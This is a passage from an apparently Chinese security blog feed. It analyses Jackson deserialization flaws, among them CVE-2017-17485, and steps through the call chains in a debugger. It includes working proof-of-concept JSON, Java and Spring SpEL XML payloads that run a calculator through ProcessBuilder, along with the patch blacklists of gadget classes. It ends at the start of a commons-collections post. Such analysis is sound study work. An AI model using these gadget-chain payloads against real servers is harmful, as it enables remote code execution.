class="keyword">return</span> Base64.encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，成功弹出计算器：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200916165821761.png" alt="image-20200916165821761"></p><p>这里我们看下PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;object&quot;:[</span><br><span class="line">        &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;transletBytecodes&quot;:[&quot;xxx&quot;],</span><br><span class="line">            &quot;transletName&quot;:&quot;test&quot;,</span><br><span class="line">            &quot;outputProperties&quot;:&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里解释下设置的几个JSON键值对：</p><ul><li>transletBytecodes——Base64编码的Exploit恶意类的字节流，编码原因可参考之前的Fastjson系列；</li><li>transletName——TemplatesImpl类对象的_name属性值；</li><li>outputProperties——为的是能够成功调用setOutputProperties()函数，该函数是outputProperties属性的setter方法，在Jackson反序列化时会被自动调用；</li></ul><h3 id="跟进调试"><a href="#跟进调试" class="headerlink" title="跟进调试"></a>跟进调试</h3><p>在<code>mapper.readValue(jsonInput, Mi1k7ea.class);</code>中打下断点；同时，我们由之前Fastjson中的分析也知道，TemplatesImpl利用链的其中一步是调用了getOutputProperties()函数，我们也在这里打下断点。</p><p>下面开始调试，其中反序列化的处理过程和之前调试的一样，我们直接跟到关键的地方看看就好。</p><p>我们知道在BeanDeserializer.vanillaDeserialize()函数中会先新建Bean实例，然后调用deserializeAndSet()函数来解析属性值并设置到该Bean中；而在deserializeAndSet()函数中，会反射调用属性的setter方法来设置属性值。</p><p>前两个属性transletBytecodes和transletName都是通过反射机制调用setter方法设置的，<strong>但是outputProperties属性在deserializeAndSet()函数中是通过反射机制调用它的getter方法，这就是该利用链能被成功触发的原因，虽然Jackson的反序列化机制只是调用setter方法，但是是调用SetterlessProperty.deserializeAndSet()来解析outputProperties属性而前面两个属性是调用的MethodProperty.deserializeAndSet()解析的，其中SetterlessProperty.deserializeAndSet()函数中是调用属性的getter方法而非setter方法</strong>。</p><p><strong>利用链：getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()-&gt;defineTransletClasses()-&gt;恶意类构造函数</strong></p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/dxhgj.jpg" alt="img"></p><p>PoC不写该属性值的话会报错，我们调试分析下原因。</p><p>跟踪到getOutputProperties()-&gt;newTransformer()-&gt;getTransletInstance()这条调用链时发现，问题出在TemplatesImpl.getTransletInstance()函数中：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/6.png" alt="img"></p><p>由于此处_name为null，导致程序提前return了，并未进入后面生成该Java类实例的代码中，从而也无法成功触发漏洞。</p><p>由前面调试分析可知，transletBytecodes和transletName属性值都是通过调用MethodProperty.deserializeAndSet()函数来反射调用其setter方法来设置的。</p><p>这里重新带上transletName属性，再次调试，跟进设置transletName属性值时的MethodProperty.deserializeAndSet()函数中，发现其调用的setter方法就是TemplatesImpl.setTransletName()函数：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/7.png" alt="img"></p><p>在大版本下，JDK1.7和1.8中，com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类是有所不同的。</p><p>当然，在小版本较高的1.7和某些1.8的还是能够成功触发的，具体的可自行测试。</p><p>在我本地的JDK 1.8.0_73 版本中，看到在TemplatesImpl.getTransletInstance()方法中调用了defineTransletClasses()函数来定义Java类，跟进看看：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/8.png" alt="img"></p><p>区别在于新建TransletClassLoader类实例的代码，其中调用了<code>_factory</code>属性，但是该属性值我们没有在PoC中设置，默认为null，于是就会抛出异常了。</p><p>那么如何设置这个<code>_factory</code>属性呢？我们在PoC中随便填入如<code>&#39;_factory&#39;:{},</code>，会看到如下错误信息：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.exc.UnrecognizedPropertyException: Unrecognized field "_factory" (class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl), not marked as ignorable (5 known properties: "uriresolver", "transletBytecodes", "outputProperties", "transletName", "stylesheetDOM"])</span><br></pre></td></tr></table></figure><p>可以看到，这个错误是Jackson.databind报的，说的是TemplatesImpl类已知的只有5个配置项，即”uriresolver”, “transletBytecodes”, “outputProperties”, “transletName”, “stylesheetDOM”。</p><p>在里面没有看到tfactory相关字样，也就是说，<strong>Jackson压根就不支持我们在序列化的TemplatesImpl类的内容上添加并解析_tfactory属性</strong>。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>这里将jackson-databind-2.7.9换成jackson-databind-2.7.9.1。</p><p>尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: <span class="function">Illegal <span class="title">type</span> <span class="params">(com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl)</span> to deserialize: prevented <span class="keyword">for</span> security reasons</span></span><br></pre></td></tr></table></figure><p>调试分析，在调用BeanDeserializerFactory.createBeanDeserializer()函数创建Bean反序列化器的时候，其中会调用checkIllegalTypes()函数提取当前类名，然后使用黑名单进行过滤：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/9.png" alt="img"></p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/10.png" alt="img"></p><p>注意：实际调试的时候回调用两次BeanDeserializerFactory.createBeanDeserializer()-&gt;checkIllegalTypes()，第一次由于是Mi1k7ea类，因此不会被过滤；第二次是TemplatesImpl类，由于其在黑名单中，因此被过滤了。</p><p>在jackson-databind-2.7.9.1-sources.jar!/com/fasterxml/jackson/databind/deser/BeanDeserializerFactory.java中，存在默认的黑名单DEFAULT_NO_DESER_CLASS_NAMES，将TemplatesImpl类以及早期其他常用反序列化利用类都过滤了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599]</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"><a href="#CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）" class="headerlink" title="CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）"></a>CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Jackson 2.7系列 &lt; 2.7.9.2</p><p>Jackson 2.8系列 &lt; 2.8.11</p><p>Jackson 2.9系列 &lt; 2.9.4</p><p>不受JDK限制，可直接在JDK1.8上运行。</p><p>需要服务端环境存在额外的jar包，以本地环境为例：jackson-annotations-2.7.9，jackson-core-2.7.9，jackson-databind-2.7.9，spring-beans-5.0.2.RELEASE，spring-context-5.0.2.RELEASE，spring-core-5.0.2.RELEASE，spring-expression-5.0.2.RELEASE，commons-logging-1.2。</p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>该漏洞需要 Spting spel表达式的配合。</p><p>首先在本地起一个http服务，spel.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"pb"</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"whatever"</span> <span class="attr">value</span>=<span class="string">"#&#123; pb.start() &#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>PoC代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//CVE-2017-17485</span></span><br><span class="line">        String payload = <span class="string">"[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:8000/spel.xml\"]"</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(payload, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功触发：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200917093034830.png" alt="image-20200917093034830"></p><h3 id="跟进调试-1"><a href="#跟进调试-1" class="headerlink" title="跟进调试"></a>跟进调试</h3><p>本次的利用链是基于org.springframework.context.support.ClassPathXmlApplicationContext类，利用的原理就是SpEL表达式注入漏洞。</p><p>我们在<code>mapper.readValue(payload, Object.class);</code>上打上断点开始调试。</p><p>首先进入：</p><p>调试到UntypedObjectDeserializer.deserializeWithType()函数，其中会调用AsArrayTypeDeserializer.deserializeTypedFromAny()函数来解析我们数组形式的JSON内容：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921090545952.png" alt="image-20200921090545952"></p><p>继续往下调试，我们在看会调用BeanDeserializerBase.deserializeFromString()函数来反序列化字符串内容，它会返回一个调用createFromString()函数从字符串中创建的实例对象：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921092147826.png" alt="image-20200921092147826"></p><p>跟进去看StdValueInstantiator.createFromString()函数，此时_fromStringCreator变量为AnnotatedConstructor类实例，参数value值为<code>http://127.0.0.1:8000/spel.xml</code>，接着就是调用AnnotatedConstructor.call1()：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921092750189.png" alt="image-20200921092750189"></p><p>继续向下调试，<code>this._fromStringCreator.call1(value);</code>这个函数，发现调用了Constructor.newInstance()方法来创建新的实例：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921093114544.png" alt="image-20200921093114544"></p><p>往下调试，会调用到ClassPathXmlApplicationContext类的构造函数，看到configLocations参数值为spel.xml文件所在的URL地址，由于refresh参数值为True，因此会调用到refresh()函数：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921093439304.png" alt="image-20200921093439304"></p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921093528071.png" alt="image-20200921093528071"></p><p><strong>注意：前面调用newInstance()是新建我们的利用类org.springframework.context.support.ClassPathXmlApplicationContext的实例，但是我们看到并没有调用ClassPathXmlApplicationContext类相关的setter方法，这是因为该类本身就没有setter方法，但是拥有构造函数，因此Jackson反序列化的时候会自动调用ClassPathXmlApplicationContext类的构造函数。而这个点就是和之前的利用链的不同之处，该类的漏洞点出在自己的构造函数而非在setter方法中。</strong></p><p>下面我们继续调试看看ClassPathXmlApplicationContext类的构造函数中是哪里存在有漏洞。</p><p>跟进refresh()函数，进行一系列refresh之前的准备操作后，发现调用了invokeBeanFactoryPostProcessors()函数，顾名思义，就是调用上下文中注册为beans的工厂处理器：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921095905752.png" alt="image-20200921095905752"></p><p>跟进invokeBeanFactoryPostProcessors()函数中调用了getBeanNamesForType()函数来获取Bean名类型：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921095841381.png" alt="image-20200921095841381"></p><p>跟进往下，进一步调用doGetBeanNamesForType()函数：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101509311.png" alt="image-20200921101509311"></p><p>在doGetBeanNamesForType()函数中，调用isFactoryBean()判断当前beanName是否为FactoryBean，此时beanName参数值为”pb”，mbd参数中识别到bean标签中的类为java.lang.ProcessBuilder：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101648261.png" alt="image-20200921101648261"></p><p>在isFactoryBean()函数中，调用predictBeanType()函数获取Bean类型：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101725897.png" alt="image-20200921101725897"></p><p>跟进predictBeanType函数，通过调用determineTargetType()函数来预测Bean类型：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921101900449.png" alt="image-20200921101900449"></p><p>跟进去，determineTargetType()函数中通过调用getTargetType()函数来确定目标类型：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102326853.png" alt="image-20200921102326853"></p><p>跟下去，AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()，用来解析Bean类，其中调用了evaluateBeanDefinitionString()函数来执行Bean定义的字符串内容，此时className参数指向”java.lang.ProcessBuilder”：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102600420.png" alt="image-20200921102600420"></p><p>跟进AbstractBeanFactory.evaluateBeanDefinitionString()函数，其中调用了this.beanExpressionResolver.evaluate()，此时this.beanExpressionResolver指向的是StandardBeanExpressionResolver，也就是说已经调用到对应的SpEL表达式解析器了：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102820137.png" alt="image-20200921102820137"></p><p>跟进StandardBeanExpressionResolver.evaluate()函数，发现调用了Expression.getValue()方法即SpEL表达式执行的方法，其中sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921102902544.png" alt="image-20200921102902544"></p><p>至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的org.springframework.context.support.ClassPathXmlApplicationContext类，它的构造函数存在SpEL注入漏洞，进而导致可被利用来触发Jackson反序列化漏洞。</p><h3 id="补丁分析-1"><a href="#补丁分析-1" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看一下换成jackson-databind-2.7.9.2版本的jar试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作：</p><p><code>com.fasterxml.jackson.databind.JsonMappingException: Illegal type (org.springframework.context.support.ClassPathXmlApplicationContext) to deserialize: prevented for security reasons</code></p><p>在jackson-databind-2.7.9.2-sources.jar!\com\fasterxml\jackson\databind\jsontype\impl\SubTypeValidator.java中可以看到具体的黑名单信息，很遗憾的是没看到我们的利用类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:</span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599])</span></span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.commons.collections4.functors.InstantiateTransformer"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.ConvertedClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.codehaus.groovy.runtime.MethodClosure"</span>);</span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.ObjectFactory"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    s.add(<span class="string">"org.apache.xalan.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1680]: may or may not be problem, take no chance</span></span><br><span class="line">    s.add(<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; JDK provided</span></span><br><span class="line">    s.add(<span class="string">"java.util.logging.FileHandler"</span>);</span><br><span class="line">    s.add(<span class="string">"java.rmi.server.UnicastRemoteObject"</span>);</span><br><span class="line">    <span class="comment">// [databind#1737]; 3rd party</span></span><br><span class="line">    <span class="comment">//s.add("org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor"); // deprecated by [databind#1855]</span></span><br><span class="line">    s.add(<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.JndiRefForwardingDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>);</span><br><span class="line">    <span class="comment">// [databind#1855]: more 3rd party</span></span><br><span class="line">    s.add(<span class="string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span>);</span><br><span class="line">    s.add(<span class="string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>);</span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如何修补的呢？调试看看。</p><p>在调用BeanDeserializerFactory.createBeanDeserializer()时，其中会调用_validateSubType()函数对子类型进行校验：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921103800554.png" alt="image-20200921103800554"></p><p>在SubTypeValidator._validateSubType()函数中看到，先进行黑名单过滤，发现类名不在黑名单后再判断是否是以”org.springframe”开头的类名，是的话循环遍历目标类的父类是否为”AbstractPointcutAdvisor”或”AbstractApplicationContext”，是的话跳出循环然后抛出异常：</p><p><img src="../images/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91Jackson/image-20200921103927724.png" alt="image-20200921103927724"></p><p>而我们的利用类其继承关系是这样的：</p><p>…-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext</p><p>可以看到，ClassPathXmlApplicationContext类是继承自AbstractApplicationContext类的，而该类会被过滤掉，从而没办法成功绕过利用。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.lmxspace.com/2019/07/30/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B1%87%E6%80%BB" target="_blank" rel="noopener">1</a></p><p><a href="https://www.mi1k7ea.com/" target="_blank" rel="noopener">2</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;往事依稀浑似梦，都随风雨到心头。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天来分析Jackson。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="漏洞分析" scheme="https://0range228.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>【反序列化漏洞】commons-collections-1 组件</title>
    <link href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/"/>
    <id>https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/</id>
    <published>2020-09-11T02:30:20.000Z</published>
    <updated>2021-05-11T08:22:17.170Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>往事依稀浑似梦，都随风雨到心头。</p></blockquote><p>今天来看经典漏洞CC链，害，经典还债环节。</p><a id="more"></a><h1 id="commons-collections-1"><a href="#commons-collections-1" class="headerlink" title="commons-collections-1"></a>commons-collections-1</h1><p>首先来看看<a href="http://commons.apache.org/proper/commons-collections/index.html" target="_blank" rel="noopener">commons-collections项目</a>吧<br>官网第一段：</p><blockquote><p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p></blockquote><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p><p>Java集合：Collection，Map</p><p>Collection：List，Set</p><p>Map：HashMap</p><p>它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能：</p><blockquote><ul><li>Transforming decorators that alter each object as it is added to the collection</li><li>转化装饰器：修改每一个添加到collection中的object</li></ul></blockquote><p><strong>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</strong></p><p><code>org.apache.commons.collections.Transformer</code>这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是利用了这一点。</p><p>漏洞复现需要下载3.1版本源码<a href="http://archive.apache.org/dist/commons/collections/binaries/" target="_blank" rel="noopener">3.1版本的下载地址</a>，进去寻觅一下源码和jar包都有。</p><h1 id="PoC分析"><a href="#PoC分析" class="headerlink" title="PoC分析"></a>PoC分析</h1><p>这里找一个网上传烂了的PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> 